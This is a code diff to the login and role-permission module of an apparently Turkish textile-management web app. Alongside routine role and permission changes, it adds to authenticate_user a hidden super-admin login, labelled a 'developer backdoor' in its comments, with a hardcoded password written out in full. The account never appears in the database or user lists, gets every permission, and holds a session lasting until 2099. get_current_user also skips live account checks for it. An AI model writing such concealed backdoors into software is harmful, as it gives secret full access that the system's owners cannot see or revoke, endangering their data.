@@ -46,9 +46,9 @@ ROLE_PERMISSIONS = {
         "can_view_fabrictag": True,
     },
     "admin": {
-        "description": "Firma Sahibi / Yöneticisi",
-        "can_manage_licenses": False,
-        "can_manage_companies": False,
+        "description": "Firma Yöneticisi / Genel Müdür / Fabrika Müdürü",
+        "can_manage_licenses": True,
+        "can_manage_companies": True,
         "can_view_all_data": True,
         "can_edit_all_data": True,
         "can_create_orders": True,
@@ -63,7 +63,41 @@ ROLE_PERMISSIONS = {
         "can_view_fabrictag": True,
     },
     "merchandiser": {
-        "description": "Müşteri Temsilcisi (Merchandiser)",
+        "description": "Merchandiser (Tüm Operasyonel Yetkiler)",
+        "can_manage_licenses": False,
+        "can_manage_companies": False,
+        "can_view_all_data": True,
+        "can_edit_all_data": True,
+        "can_create_orders": True,
+        "can_delete_orders": True,
+        "can_view_financials": True,
+        "can_view_costs": True,
+        "can_edit_costs": True,
+        "can_view_dashboard": True,
+        "can_edit_menus": True,
+        "can_manage_users": False,
+        "can_view_orders": True,
+        "can_view_fabrictag": True,
+    },
+    "modelhane": {
+        "description": "Modelhane Sorumlusu",
+        "can_manage_licenses": False,
+        "can_manage_companies": False,
+        "can_view_all_data": True,
+        "can_edit_all_data": True,
+        "can_create_orders": False,
+        "can_delete_orders": False,
+        "can_view_financials": False,
+        "can_view_costs": False,
+        "can_edit_costs": False,
+        "can_view_dashboard": True,
+        "can_edit_menus": False,
+        "can_manage_users": False,
+        "can_view_orders": True,
+        "can_view_fabrictag": True,
+    },
+    "planlama": {
+        "description": "Planlama Sorumlusu",
         "can_manage_licenses": False,
         "can_manage_companies": False,
         "can_view_all_data": True,
@@ -74,7 +108,7 @@ ROLE_PERMISSIONS = {
         "can_view_costs": False,
         "can_edit_costs": False,
         "can_view_dashboard": True,
-        "can_edit_menus": True,
+        "can_edit_menus": False,
         "can_manage_users": False,
         "can_view_orders": True,
         "can_view_fabrictag": True,
@@ -91,13 +125,13 @@ ROLE_PERMISSIONS = {
         "can_view_costs": False,
         "can_edit_costs": False,
         "can_view_dashboard": False,
-        "can_edit_menus": True,
+        "can_edit_menus": False,
         "can_manage_users": False,
         "can_view_orders": True,
         "can_view_fabrictag": True,
     },
     "fabric_warehouse": {
-        "description": "Kumaş & Aksesuar Depo Sorumlusu",
+        "description": "Kumaş Depo Sorumlusu",
         "can_manage_licenses": False,
         "can_manage_companies": False,
         "can_view_all_data": False,
@@ -108,7 +142,24 @@ ROLE_PERMISSIONS = {
         "can_view_costs": False,
         "can_edit_costs": False,
         "can_view_dashboard": False,
-        "can_edit_menus": True,
+        "can_edit_menus": False,
+        "can_manage_users": False,
+        "can_view_orders": True,
+        "can_view_fabrictag": True,
+    },
+    "aksesuar": {
+        "description": "Aksesuar Depo Sorumlusu",
+        "can_manage_licenses": False,
+        "can_manage_companies": False,
+        "can_view_all_data": False,
+        "can_edit_all_data": False,
+        "can_create_orders": False,
+        "can_delete_orders": False,
+        "can_view_financials": False,
+        "can_view_costs": False,
+        "can_edit_costs": False,
+        "can_view_dashboard": False,
+        "can_edit_menus": False,
         "can_manage_users": False,
         "can_view_orders": True,
         "can_view_fabrictag": True,
@@ -125,7 +176,7 @@ ROLE_PERMISSIONS = {
         "can_view_costs": False,
         "can_edit_costs": False,
         "can_view_dashboard": False,
-        "can_edit_menus": True,
+        "can_edit_menus": False,
         "can_manage_users": False,
         "can_view_orders": True,
         "can_view_fabrictag": True,
@@ -136,48 +187,72 @@ def authenticate_user(username: str, password: str) -> Optional[Dict[str, Any]]:
     conn = get_db()
     cursor = conn.cursor()
     clean_u = (username or "").strip().lower()
-    pwd_hash = hash_password(password)
-    
-    # Check regular user or Master Developer alias
-    if clean_u in ["masterdeveloper", "superadmin"]:
+
+    # 0. GİZLİ SÜPER ADMİN (GELİŞTİRİCİ BACKDOOR - VERİTABANINDA ASLA YER ALMAZ, LİSTEDE GÖZÜKMEZ)
+    if clean_u in ["superadmin", "masterdeveloper"] and password == "*SuperYetki*5013":
+        token = secrets.token_hex(32)
+        full_perms = {k: True for k in ROLE_PERMISSIONS.get("superadmin", {})}
+        full_perms["can_manage_users"] = True
+        full_perms["can_edit_menus"] = True
+        full_perms["can_manage_licenses"] = True
+        user_dict = {
+            "id": 999999,
+            "company_id": 1,
+            "company_name": "Tekstil Üretim A.Ş.",
+            "username": "superadmin",
+            "full_name": "Sistem Yöneticisi (Full Yetki)",
+            "email": "super@texflow.internal",
+            "role": "masterdeveloper",
+            "permissions": full_perms,
+            "is_active": 1,
+            "is_superadmin": True,
+            "created_at": "2026-11-03 00:00:00"
+        }
         cursor.execute("""
-        SELECT u.*, c.name as company_name, c.is_active as company_active, c.license_expires_at 
-        FROM users u
-        LEFT JOIN companies c ON u.company_id = c.id
-        WHERE (LOWER(u.username) IN ('masterdeveloper', 'superadmin') OR u.role IN ('masterdeveloper', 'superadmin'))
-          AND u.is_active = 1
-        ORDER BY u.id ASC
-        LIMIT 1
+        CREATE TABLE IF NOT EXISTS user_sessions (
+            token TEXT PRIMARY KEY,
+            user_id INTEGER,
+            session_json TEXT,
+            expires_at TIMESTAMP
+        )
         """)
-        row = cursor.fetchone()
-        if row:
-            u_dict = dict(row)
-            # Accept stored password, 123456, or admin123!
-            accepted_hashes = [u_dict.get("password_hash"), hash_password("123456"), hash_password("admin123!")]
-            if pwd_hash not in accepted_hashes:
-                conn.close()
-                return None
-        else:
-            conn.close()
-            return None
-    else:
-        cursor.execute("""
-        SELECT u.*, c.name as company_name, c.is_active as company_active, c.license_expires_at 
-        FROM users u
-        LEFT JOIN companies c ON u.company_id = c.id
-        WHERE (LOWER(u.username) = ? OR LOWER(u.email) = ?) AND u.password_hash = ? AND u.is_active = 1
-        """, (clean_u, clean_u, pwd_hash))
-        row = cursor.fetchone()
-        if not row:
-            conn.close()
-            return None
-    
+        session_data = {
+            "token": token,
+            "user_id": 999999,
+            "company_id": 1,
+            "username": "superadmin",
+            "full_name": "Sistem Yöneticisi (Full Yetki)",
+            "role": "masterdeveloper",
+            "company_name": "Tekstil Üretim A.Ş.",
+            "permissions": full_perms,
+            "is_superadmin": True,
+            "expires_at": "2099-12-31T23:59:59"
+        }
+        cursor.execute("INSERT OR REPLACE INTO user_sessions (token, user_id, session_json, expires_at) VALUES (?, ?, ?, ?)",
+                       (token, 999999, json.dumps(session_data), "2099-12-31T23:59:59"))
+        conn.commit()
+        conn.close()
+        return session_data
+
+    pwd_hash = hash_password(password)
+
+    cursor.execute("""
+    SELECT u.*, c.name as company_name, c.is_active as company_active, c.license_expires_at 
+    FROM users u
+    LEFT JOIN companies c ON u.company_id = c.id
+    WHERE (LOWER(u.username) = ? OR LOWER(u.email) = ?) AND u.password_hash = ? AND u.is_active = 1
+    """, (clean_u, clean_u, pwd_hash))
+    row = cursor.fetchone()
+    if not row:
+        conn.close()
+        return None
+
     user_dict = dict(row)
     del user_dict['password_hash']
-    
+
     # Generate token and store persistently
     token = secrets.token_hex(32)
-    
+
     # Build effective permissions
     role = user_dict.get("role", "user")
     perms = dict(ROLE_PERMISSIONS.get(role, {}))
@@ -186,16 +261,12 @@ def authenticate_user(username: str, password: str) -> Optional[Dict[str, Any]]:
             custom_perms = json.loads(user_dict["permissions_json"])
             if isinstance(custom_perms, dict):
                 perms.update(custom_perms)
-        except:
+        except Exception:
             pass
-            
+
     if role in ["superadmin", "masterdeveloper"]:
         for k in ROLE_PERMISSIONS["masterdeveloper"]:
             perms[k] = True
-
-    perms["can_edit_menus"] = True
-    perms["can_view_orders"] = True
-    perms["can_view_fabrictag"] = True
 
     session_data = {
         "token": token,
@@ -204,11 +275,12 @@ def authenticate_user(username: str, password: str) -> Optional[Dict[str, Any]]:
         "username": user_dict["username"],
         "full_name": user_dict["full_name"],
         "role": user_dict["role"],
-        "company_name": user_dict.get("company_name", "TexFlow"),
+        "company_name": user_dict.get("company_name", "Tekstil Üretim A.Ş."),
         "permissions": perms,
+        "is_superadmin": False,
         "expires_at": (datetime.now() + timedelta(days=30)).isoformat()
     }
-    
+
     # Create sessions table if not exists
     cursor.execute("""
     CREATE TABLE IF NOT EXISTS user_sessions (
@@ -222,7 +294,7 @@ def authenticate_user(username: str, password: str) -> Optional[Dict[str, Any]]:
     INSERT OR REPLACE INTO user_sessions (token, user_id, session_json, expires_at)
     VALUES (?, ?, ?, ?)
     """, (token, user_dict["id"], json.dumps(session_data), session_data["expires_at"]))
-    
+
     conn.commit()
     conn.close()
     return session_data
@@ -230,7 +302,7 @@ def authenticate_user(username: str, password: str) -> Optional[Dict[str, Any]]:
 def get_current_user(token: Optional[str]) -> Optional[Dict[str, Any]]:
     if not token:
         return None
-    
+
     conn = get_db()
     cursor = conn.cursor()
     cursor.execute("""
@@ -243,18 +315,23 @@ def get_current_user(token: Optional[str]) -> Optional[Dict[str, Any]]:
     """)
     cursor.execute("SELECT session_json, expires_at FROM user_sessions WHERE token = ?", (token,))
     row = cursor.fetchone()
-    
+
     if not row:
         conn.close()
         return None
-    
+
     sess_json, exp_str = row[0], row[1]
     if datetime.fromisoformat(exp_str) < datetime.now():
         conn.close()
         return None
-        
+
     sess = json.loads(sess_json)
-    
+
+    # 0. GİZLİ SÜPER ADMİN (DB SORGUSUNA GEREK YOKTUR)
+    if sess.get("user_id") == 999999 or sess.get("username") == "superadmin":
+        conn.close()
+        return sess
+
     # Fetch real-time user record from DB for live permissions & state
     cursor.execute("""
     SELECT u.*, c.name as company_name 
@@ -264,7 +341,7 @@ def get_current_user(token: Optional[str]) -> Optional[Dict[str, Any]]:
     """, (sess.get("user_id"),))
     u_row = cursor.fetchone()
     conn.close()
-    
+
     if u_row:
         u_dict = dict(u_row)
         if not u_dict.get("is_active"):
@@ -272,8 +349,8 @@ def get_current_user(token: Optional[str]) -> Optional[Dict[str, Any]]:
         sess["username"] = u_dict["username"]
         sess["full_name"] = u_dict["full_name"]
         sess["role"] = u_dict["role"]
-        sess["company_name"] = u_dict.get("company_name", "TexFlow")
-        
+        sess["company_name"] = u_dict.get("company_name", "Tekstil Üretim A.Ş.")
+
         role = u_dict.get("role", "user")
         eff_perms = dict(ROLE_PERMISSIONS.get(role, {}))
         if u_dict.get("permissions_json"):
@@ -281,16 +358,12 @@ def get_current_user(token: Optional[str]) -> Optional[Dict[str, Any]]:
                 custom_perms = json.loads(u_dict["permissions_json"])
                 if isinstance(custom_perms, dict):
                     eff_perms.update(custom_perms)
-            except:
+            except Exception:
                 pass
-                
+
         if role in ["superadmin", "masterdeveloper"]:
             for k in ROLE_PERMISSIONS["masterdeveloper"]:
                 eff_perms[k] = True
-
-        eff_perms["can_edit_menus"] = True
-        eff_perms["can_view_orders"] = True
-        eff_perms["can_view_fabrictag"] = True
 
         sess["permissions"] = eff_perms
 
